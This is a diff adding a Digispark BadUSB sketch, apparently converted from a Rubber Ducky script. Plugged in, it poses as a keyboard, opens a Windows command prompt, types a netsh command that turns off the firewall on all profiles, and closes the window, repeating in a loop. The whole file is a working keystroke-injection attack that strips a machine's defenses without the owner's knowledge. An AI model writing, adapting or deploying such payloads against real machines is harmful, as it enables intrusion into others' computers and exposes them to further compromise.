@@ -1,0 +1,23 @@
+// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 
+
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+	DigiKeyboard.sendKeyStroke(0);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.print("cmd");
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.print("netsh advfirewall set allprofiles state off");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
+}
